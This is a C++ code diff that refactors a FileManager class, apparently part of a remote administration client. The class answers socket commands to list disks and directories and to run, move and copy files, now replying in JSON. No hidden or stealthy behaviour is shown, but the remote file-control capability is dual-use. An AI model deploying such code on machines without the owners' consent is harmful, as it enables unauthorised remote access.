@@ -33,13 +33,13 @@ std::string FileManager::readDirectory(const std::filesystem::path &directory, b
     return paths;
 }
 
-void FileManager::send() {
-
-}
-
 void FileManager::sendDirectory(nlohmann::json jsonObject){
+    nlohmann::json json;
+    json["RESPONSE"] = "DIRECTORY";
+    json["requested_directory"] =  jsonObject["path"];
     std::string result = getFilesAndFolders(std::move(jsonObject));
-    stream.sendString(result.c_str());
+    json["directory"] = result;
+    clientSocket.sendMessage(json.dump());
 }
 
 std::string FileManager::getFilesAndFolders(nlohmann::json jsonObject){
@@ -51,8 +51,11 @@ std::string FileManager::getFilesAndFolders(nlohmann::json jsonObject){
 }
 
 void FileManager::sendDisks(){
-    std::cout << "Socket: " << stream.getSock() << std::endl;
-    stream.sendList(getDisks());
+    std::vector<std::string> vectorOfDisks = FileManager::getDisks();
+    nlohmann::json json;
+    json["RESPONSE"] = "DISKS";
+    json["disks"] = vectorOfDisks;
+    clientSocket.sendMessage(json.dump());
 }
 
 std::vector<std::string> FileManager::getDisks() {
@@ -151,7 +154,8 @@ void FileManager::copyFilesThread(nlohmann::json jsonObject){
 }
 
 
-FileManager::FileManager(const Stream &stream, std::unordered_map<std::string, std::function<void(nlohmann::json &)>> &actionMap) : Sender(stream, actionMap) {
+FileManager::FileManager(ClientSocket &clientSocket) : Handler(clientSocket) {
+    ActionMap& actionMap = clientSocket.getActionMap();
     actionMap["RUN"] =[&](nlohmann::json& json) {
         threadGen.runInNewThread(this, &FileManager::runFilesThread, json);
     };
@@ -164,11 +168,11 @@ FileManager::FileManager(const Stream &stream, std::unordered_map<std::string, s
     actionMap["MOVE"] = [&](nlohmann::json& json) {
         threadGen.runInNewThread(this, &FileManager::moveFilesThread, json);
     };
-    actionMap["SEND_DISKS"]  = [&](nlohmann::json& json) {
+    actionMap["DISKS"]  = [&](nlohmann::json& json) {
         std::cout << "hello world" << std::endl;
         threadGen.runInNewThread(this, &FileManager::sendDisks);
     };
-    actionMap["SEND_DIRECTORY"]  = [&](nlohmann::json& json) {
+    actionMap["DIRECTORY"]  = [&](nlohmann::json& json) {
         threadGen.runInNewThread(this, &FileManager::sendDirectory, json);
     };
 }
